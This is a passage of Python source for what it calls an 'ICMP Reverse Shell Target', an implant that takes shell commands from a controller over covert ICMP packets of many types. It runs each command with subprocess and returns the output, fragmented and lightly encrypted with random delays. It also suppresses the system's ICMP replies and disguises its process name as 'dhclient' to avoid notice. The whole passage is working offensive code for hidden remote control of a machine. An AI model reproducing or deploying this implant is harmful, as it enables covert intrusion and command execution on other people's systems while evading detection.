                                                send_output(addr[0], output, pkt_seq, rep_type, icmp_id, out_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, poly_seed=poly_seed, mutation_count=mutation_count, delay_mode=delay_mode, delay_min=delay_min, delay_max=delay_max, layers=layers, selected_ops=selected_ops)
                                        del frag_buffers[frag_id]
                            else:
                                command = rest.decode('utf-8', errors='ignore').strip()
                                if command == "ALIVE":
                                    send_output(addr[0], "ALIVE", pkt_seq, rep_type, icmp_id, out_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, poly_seed=poly_seed, mutation_count=mutation_count, delay_mode=delay_mode, delay_min=delay_min, delay_max=delay_max, layers=layers, selected_ops=selected_ops)
                                else:
                                    print(f"Executing: {command}")
                                    try:
                                        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                                        output = result.decode('utf-8', errors='ignore')
                                    except Exception as e:
                                        output = str(e)
                                    send_output(addr[0], output, pkt_seq, rep_type, icmp_id, out_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, poly_seed=poly_seed, mutation_count=mutation_count, delay_mode=delay_mode, delay_min=delay_min, delay_max=delay_max, layers=layers, selected_ops=selected_ops)
                        else:
                            if controller_ip is not None and addr[0] == controller_ip and frag_transfers:
                                for fid in list(frag_transfers.keys()):
                                    trans = frag_transfers[fid]
                                    if trans['sent'] < len(trans['frags']):
                                        num, frag_data = trans['frags'][trans['sent']]
                                        frag_payload = out_prefix + (FRAG_PREFIX_ECHO if is_echo else FRAG_PREFIX) + struct.pack('!2sH' if is_echo else '!4sI', fid, num) + frag_data
                                        encrypted_frag = light_encrypt(frag_payload, padding_seed, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops)
                                        time.sleep(random.uniform(0.005, 0.05))
                                        send_packet(addr[0], rep_type, icmp_id, pkt_seq, encrypted_frag, family, proto, poly_seed, mutation_count)
                                        trans['sent'] += 1
                                        trans['last_sent'] = time.time()
                                        if trans['sent'] == len(trans['frags']):
                                            del frag_transfers[fid]
                                        break
            for fid in list(frag_buffers.keys()):
                if time.time() - frag_buffers[fid]['ts'] > FRAG_TIMEOUT:
                    del frag_buffers[fid]

def signal_handler(signum, frame):
    cleanup_blocking_rules(family, rep_type)
    sys.exit(0)

def main(req_type, rep_type, icmp_id, family, proto):
    global is_echo
    is_echo = (req_type == 8 and rep_type == 0) or (req_type == 128 and rep_type == 129)
    dummy_target = '8.8.8.8' if family == socket.AF_INET else '2001:4860:4860::8888'
    local_ip = get_local_ip(dummy_target, family)
    print(f"ICMP Reverse Shell Target started. Using ICMP types: Request {req_type}/Reply {rep_type}, ID: {hex(icmp_id)}. Waiting for handshake.")
    
    apply_blocking_rules(family, rep_type)
    atexit.register(cleanup_blocking_rules, family, rep_type)
    
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    ignore_file = None
    if is_echo:
        ignore_file = suppress_icmp(family)
        atexit.register(unsuppress_icmp, ignore_file)
    
    listener_thread = threading.Thread(target=receive_commands, args=(req_type, rep_type, icmp_id, family, proto, local_ip), daemon=True)
    listener_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting.")
        if ignore_file:
            unsuppress_icmp(ignore_file)
        sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ICMP Reverse Shell Target")
    parser.add_argument("--id", type=lambda x: int(x, 0), default=ICMP_ID, help="Custom ICMP ID (hex or decimal, default 0x1337)")
    parser.add_argument("--ipv6", action="store_true", help="Use IPv6")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-E", action="store_true", help="Use Echo Request/Reply (types 8/0 or 128/129, default)")
    group.add_argument("-T", action="store_true", help="Use Timestamp Request/Reply (types 13/14, IPv4 only)")
    group.add_argument("-M", action="store_true", help="Use Address Mask Request/Reply (types 17/18, IPv4 only)")
    group.add_argument("-R", action="store_true", help="Use Information Request/Reply (types 15/16, IPv4 only)")
    group.add_argument("-S", action="store_true", help="Use Router Sol/Adv (types 10/9 or 133/134)")
    group.add_argument("-X", action="store_true", help="Use Experimental 1/2 (types 253/254)")
    group.add_argument("-N", action="store_true", help="Use Neighbor Sol/Adv (types 135/136, IPv6 only)")
    group.add_argument("-D", action="store_true", help="Use Domain Name Req/Rep (types 37/38, IPv4 only)")
    group.add_argument("-O", action="store_true", help="Use Mobile Reg Req/Rep (types 35/36, IPv4 only)")
    group.add_argument("-TR", action="store_true", help="Use Traceroute (types 30/0, IPv4 only, deprecated)")
    group.add_argument("-P", action="store_true", help="Use Photuris (types 40/40, IPv4 only)")
    group.add_argument("-EE", action="store_true", help="Use Extended Echo (types 42/43)")

    args = parser.parse_args()

    libc = ctypes.CDLL("libc.so.6")
    PR_SET_NAME = 15
    libc.prctl(PR_SET_NAME, ctypes.c_char_p(b"dhclient\0"), 0, 0, 0)

    family = socket.AF_INET6 if args.ipv6 else socket.AF_INET
    proto = socket.IPPROTO_ICMPV6 if args.ipv6 else socket.IPPROTO_ICMP

    if args.ipv6:
        if args.E or not any([args.T, args.M, args.R, args.S, args.X, args.N, args.D, args.O, args.TR, args.P, args.EE]):
            req_type = 128
            rep_type = 129
        elif args.S:
            req_type = 133
            rep_type = 134
        elif args.X:
            req_type = 253
            rep_type = 254
        elif args.N:
            req_type = 135
            rep_type = 136
        elif args.EE:
            req_type = 42
            rep_type = 43
        else:
            print("Selected type not supported for IPv6")
            sys.exit(1)
    else:
        if args.E or not any([args.T, args.M, args.R, args.S, args.X, args.N, args.D, args.O, args.TR, args.P, args.EE]):
            req_type = 8
            rep_type = 0
        elif args.T:
            req_type = 13
            rep_type = 14
        elif args.M:
            req_type = 17
            rep_type = 18
        elif args.R:
            req_type = 15
            rep_type = 16
        elif args.S:
            req_type = 10
            rep_type = 9
        elif args.X:
            req_type = 253
            rep_type = 254
        elif args.D:
            req_type = 37
            rep_type = 38
        elif args.O:
            req_type = 35
            rep_type = 36
        elif args.TR:
            req_type = 30
            rep_type = 0
        elif args.P:
            req_type = 40
            rep_type = 40
        elif args.EE:
            req_type = 42
            rep_type = 43
        elif args.N:
            print("Neighbor Sol/Adv supported only for IPv6")
            sys.exit(1)

    main(req_type, rep_type, args.id, family, proto)
